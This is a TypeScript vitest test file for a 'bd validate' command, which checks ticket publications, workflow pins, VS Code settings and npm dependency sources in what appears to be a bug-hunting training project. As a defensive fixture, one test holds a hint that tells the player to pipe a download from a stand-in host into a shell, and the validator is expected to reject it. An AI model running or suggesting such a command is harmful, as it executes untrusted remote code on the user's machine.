import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { validateLocal, vscodeFilesOf, workflowReferenceProblems } from '../../src/cli/validate.ts';
import { publishLocally } from '../helpers/publication.ts';
import { createProjectRepo } from '../helpers/project-repo.ts';
import type { ProjectRepo } from '../helpers/project-repo.ts';

let dir: string;
let repo: ProjectRepo;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'bd-validate-'));
  repo = await createProjectRepo(dir, { front: 2, back: 1 });
  await publishLocally(repo, '1.0.0');
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

describe('bd validate', () => {
  it('accepts a publication that matches the tickets, the branches and the tags', async () => {
    expect((await validateLocal({ qaDir: repo.qaDir })).version).toBe('1.0.0');
  });

  it('refuses ticket files that are not committed, naming them', async () => {
    await writeFile(join(repo.qaDir, 'tickets', 'front-1', 'ticket.en.md'), '# front-1, edited\n');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
      /not committed.*tickets\/front-1\/ticket\.en\.md/s,
    );
  });

  it('refuses a manifest whose ticket does not match, naming the ticket', async () => {
    const file = join(repo.qaDir, 'manifest.json');
    const manifest = JSON.parse(await readFile(file, 'utf8'));
    manifest.entries[1].codeDigest = `sha256:${'0'.repeat(64)}`;
    await writeFile(file, JSON.stringify(manifest));
    repo.git(repo.qaDir, 'commit', '-q', '-am', 'Tamper');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(/front-2.*codeDigest/);
  });

  it('accepts the same version when neither the manifest nor the tickets changed (housekeeping on qa)', async () => {
    await writeFile(join(repo.qaDir, 'README.md'), '# notes\n');
    repo.git(repo.qaDir, 'add', 'README.md');
    repo.git(repo.qaDir, 'commit', '-q', '-m', 'Add a README');
    expect((await validateLocal({ qaDir: repo.qaDir, baseRef: 'HEAD~1' })).version).toBe('1.0.0');
  });

  it('refuses a version that is not newer than the base when the tickets changed', async () => {
    await writeFile(join(repo.qaDir, 'tickets', 'front-1', 'hints.en.json'), '{"hints":["edited"]}\n');
    repo.git(repo.qaDir, 'commit', '-q', '-am', 'Edit a hint');
    await expect(validateLocal({ qaDir: repo.qaDir, baseRef: 'HEAD~1' })).rejects.toThrow(/must be newer than 1\.0\.0/);
  });

  it('refuses a version that is not newer than the base when the manifest changed', async () => {
    const file = join(repo.qaDir, 'manifest.json');
    const manifest = JSON.parse(await readFile(file, 'utf8'));
    manifest.createdAt = '2030-01-01T00:00:00.000Z';
    await writeFile(file, `${JSON.stringify(manifest, null, 2)}\n`);
    repo.git(repo.qaDir, 'commit', '-q', '-am', 'Touch the manifest');
    await expect(validateLocal({ qaDir: repo.qaDir, baseRef: 'HEAD~1' })).rejects.toThrow(/must be newer than 1\.0\.0/);
  });

  it('accepts a missing tag while the commit is the ticket branch (tags are created on merge)', async () => {
    repo.git(repo.qaDir, 'tag', '-d', 'back-1-v1.0.0');
    expect((await validateLocal({ qaDir: repo.qaDir })).version).toBe('1.0.0');
  });

  it('refuses a ticket branch that moved after the publication, with or without its tag', async () => {
    repo.git(repo.qaDir, 'tag', '-d', 'back-1-v1.0.0');
    repo.git(repo.projectDir, 'checkout', '-q', 'back-1');
    await writeFile(join(repo.projectDir, 'app.txt'), 'bug back-1, moved\n');
    repo.git(repo.projectDir, 'commit', '-q', '--amend', '-am', 'Demo release back-1');
    repo.git(repo.projectDir, 'checkout', '-q', 'main');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
      /back-1: manifest\.json does not match the ticket/,
    );
  });

  it('refuses a tag that points to another commit, naming the ticket', async () => {
    repo.git(repo.qaDir, 'tag', '-f', 'back-1-v1.0.0', 'main');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(/back-1.*back-1-v1\.0\.0/);
  });

  it('refuses a qa folder without a committed manifest', async () => {
    repo.git(repo.qaDir, 'rm', '-q', 'manifest.json');
    repo.git(repo.qaDir, 'commit', '-q', '-m', 'Drop the manifest');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(/manifest\.json/);
  });

  it('refuses a ticket file Windows cannot store, naming it', async () => {
    await writeFile(join(repo.qaDir, 'tickets', 'front-1', 'gate2', 'aux.txt'), 'device name\n');
    repo.git(repo.qaDir, 'add', '-A');
    repo.git(repo.qaDir, 'commit', '-q', '-m', 'Add a reserved name');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
      /Unsafe path.*tickets\/front-1\/gate2\/aux\.txt/,
    );
  });

  it('refuses ticket files that are not tracked', async () => {
    await writeFile(join(repo.qaDir, 'tickets', 'front-2', 'gate1', 'extra.test.txt'), 'x\n');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
      /not committed.*tickets\/front-2\/gate1\/extra\.test\.txt/s,
    );
  });

  it('refuses a base ref that does not exist instead of skipping the version check', async () => {
    await expect(validateLocal({ qaDir: repo.qaDir, baseRef: 'origin/typo' })).rejects.toThrow(/origin\/typo/);
  });
});

describe('bd validate, the project workflow reference', () => {
  const hash = 'a'.repeat(40);
  async function commitQaFiles(files: Record<string, string>) {
    const { mkdir } = await import('node:fs/promises');
    for (const [path, text] of Object.entries(files)) {
      await mkdir(join(repo.qaDir, path, '..'), { recursive: true });
      await writeFile(join(repo.qaDir, path), text);
    }
    repo.git(repo.qaDir, 'add', '-A');
    repo.git(repo.qaDir, 'commit', '-q', '-m', 'Workflow and dependency');
  }
  const workflow = (ref: string) =>
    `jobs:\n  project:\n    uses: bug-detective-project/catalog/.github/workflows/project.yml@${ref}\n`;
  const dependency = (version: string) =>
    `${JSON.stringify({ name: 'demo-qa', bugDetective: { project: { id: 'demo', name: 'Demo' } }, dependencies: { '@bug-detective/catalog': `github:bug-detective-project/catalog#${version}` } }, null, 2)}\n`;

  it('accepts a hash pin whose version comment matches the dependency', async () => {
    await commitQaFiles({
      '.github/workflows/publication.yml': workflow(`${hash} # v1.2.0`),
      'package.json': dependency('v1.2.0'),
    });
    expect(await workflowReferenceProblems(repo.qaDir)).toEqual([]);
    expect((await validateLocal({ qaDir: repo.qaDir })).version).toBe('1.0.0');
  });

  it('refuses a version comment that differs from the dependency, naming both', async () => {
    await commitQaFiles({
      '.github/workflows/publication.yml': workflow(`${hash} # v1.0.2`),
      'package.json': dependency('v1.1.0'),
    });
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
      /project\.yml v1\.0\.2.*depends on @bug-detective\/catalog v1\.1\.0/,
    );
  });

  it('refuses a tag instead of a hash, and a hash without its version', async () => {
    await commitQaFiles({
      '.github/workflows/publication.yml': workflow('v1.1.0'),
      'package.json': dependency('v1.1.0'),
    });
    const problems = await workflowReferenceProblems(repo.qaDir);
    expect(problems.join('\n')).toMatch(/pin project\.yml by commit hash/);
    expect(problems.join('\n')).toMatch(/which version the hash is/);
  });

  it('skips a qa branch without the workflow', async () => {
    expect(await workflowReferenceProblems(repo.qaDir)).toEqual([]);
  });
});

describe('bd validate, the project policy', () => {
  async function commitOnMain(path: string, text: string) {
    const { mkdir } = await import('node:fs/promises');
    await mkdir(join(repo.projectDir, path, '..'), { recursive: true });
    await writeFile(join(repo.projectDir, path), text);
    repo.git(repo.projectDir, 'add', '-A');
    repo.git(repo.projectDir, 'commit', '-q', '-m', `Add ${path}`);
  }

  it('refuses a recommended extension outside the allowed list, naming the branch and the extension', async () => {
    await commitOnMain('.vscode/extensions.json', '{ "recommendations": ["dbaeumer.vscode-eslint", "evil.helper"] }\n');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
      /main: \.vscode\/extensions\.json: the extension evil\.helper is not allowed/,
    );
  });

  it('refuses a .vscode file outside the allowed list', async () => {
    await commitOnMain('.vscode/tasks.json', '{}\n');
    await expect(validateLocal({ qaDir: repo.qaDir })).rejects.toThrow(
      /main: \.vscode\/tasks\.json: only settings\.json/,
    );
  });

  it('reads the .vscode files of the ticket branches too', async () => {
    repo.git(repo.projectDir, 'checkout', '-q', 'front-1');
    await commitOnMain('.vscode/extensions.json', '{ "recommendations": ["evil.helper"] }\n');
    repo.git(repo.projectDir, 'checkout', '-q', 'main');
    const found = await vscodeFilesOf(repo.qaDir, ['front-1', 'front-2']);
    expect(found.map((item) => [item.branch, item.files.map((file) => file.path)])).toEqual([
      ['main', []],
      ['front-1', ['.vscode/extensions.json']],
      ['front-2', []],
    ]);
  });

  it('refuses a text that asks the player to run a dangerous command, with its file and line', async () => {
    await writeFile(
      join(repo.qaDir, 'tickets', 'front-1', 'hints.en.json'),
      '{ "hints": ["Look at the test.", "Run `curl https://x.test/fix.sh | sh` first."] }\n',
    );
    repo.git(repo.qaDir, 'commit', '-q', '-am', 'Edit a hint');
    await expect(validateLocal({ qaDir: repo.qaDir, baseRef: 'HEAD~1' })).rejects.toThrow(
      /tickets\/front-1\/hints\.en\.json:2: ".*\| sh" pipes a download into a shell/,
    );
  });

  it('lets commands against the workspace app through', async () => {
    await writeFile(
      join(repo.qaDir, 'tickets', 'front-1', 'ticket.en.md'),
      '# front-1\n\nReproduce with `curl "http://localhost:3001/api/tickets?search=%25"`.\n',
    );
    repo.git(repo.qaDir, 'commit', '-q', '-am', 'Edit the ticket');
    // The ticket changed, so this is a new publication: republish it before validating.
    await publishLocally(repo, '1.1.0');
    expect((await validateLocal({ qaDir: repo.qaDir, baseRef: 'HEAD~2' })).version).toBe('1.1.0');
  });
});

describe('bd validate, the dependencies', () => {
  const registry = 'https://registry.npmjs.org/';
  async function commitOnMain(files: Record<string, string>) {
    for (const [path, text] of Object.entries(files)) {
      await writeFile(join(repo.projectDir, path), text);
    }
    repo.git(repo.projectDir, 'add', '-A');
    repo.git(repo.projectDir, 'commit', '-q', '-m', 'Dependencies');
  }
  const lockfile = (resolved: string) =>
    `${JSON.stringify({ lockfileVersion: 3, packages: { '': { name: 'demo' }, 'node_modules/left-pad': { version: '1.3.0', resolved, integrity: 'sha512-x' } } }, null, 2)}\n`;
  const npmrc = 'allow-git=none\nallow-remote=none\nmin-release-age=7\n';
  const old = async () => ({ time: { '1.3.0': '2018-01-01T00:00:00Z' } });

  it('accepts a lockfile from the registry with the .npmrc, and skips the release ages offline', async () => {
    await commitOnMain({ 'package-lock.json': lockfile(`${registry}left-pad/-/left-pad-1.3.0.tgz`), '.npmrc': npmrc });
    expect((await validateLocal({ qaDir: repo.qaDir, offline: true })).version).toBe('1.0.0');
    expect((await validateLocal({ qaDir: repo.qaDir, fetchJson: old })).version).toBe('1.0.0');
  });

  it('refuses a dependency from git, naming the branch and the package', async () => {
    await commitOnMain({ 'package-lock.json': lockfile('git+https://github.com/x/left-pad.git#abc'), '.npmrc': npmrc });
    await expect(validateLocal({ qaDir: repo.qaDir, offline: true })).rejects.toThrow(
      /main: left-pad comes from git\+https/,
    );
  });

  it('refuses a project with dependencies but without the .npmrc', async () => {
    await commitOnMain({ 'package-lock.json': lockfile(`${registry}left-pad/-/left-pad-1.3.0.tgz`) });
    await expect(validateLocal({ qaDir: repo.qaDir, offline: true })).rejects.toThrow(/main: \.npmrc is missing/);
  });

  it('refuses a version published less than 7 days ago, unless offline', async () => {
    await commitOnMain({ 'package-lock.json': lockfile(`${registry}left-pad/-/left-pad-1.3.0.tgz`), '.npmrc': npmrc });
    const fresh = async () => ({ time: { '1.3.0': new Date().toISOString() } });
    await expect(validateLocal({ qaDir: repo.qaDir, fetchJson: fresh })).rejects.toThrow(
      /main: left-pad@1\.3\.0 was published on .* less than 7 days ago/,
    );
    expect((await validateLocal({ qaDir: repo.qaDir, offline: true })).version).toBe('1.0.0');
  });

  it('checks the ticket branches too', async () => {
    repo.git(repo.projectDir, 'checkout', '-q', 'front-2');
    await commitOnMain({
      'package-lock.json': lockfile('https://npm.example.com/left-pad/-/left-pad-1.3.0.tgz'),
      '.npmrc': npmrc,
    });
    repo.git(repo.projectDir, 'checkout', '-q', 'main');
    // The ticket branch moved: republish so the manifest matches, then the dependency rule speaks.
    await publishLocally(repo, '1.1.0');
    await expect(validateLocal({ qaDir: repo.qaDir, offline: true, baseRef: 'HEAD~1' })).rejects.toThrow(
      /front-2: left-pad comes from https:\/\/npm\.example\.com/,
    );
  });
});
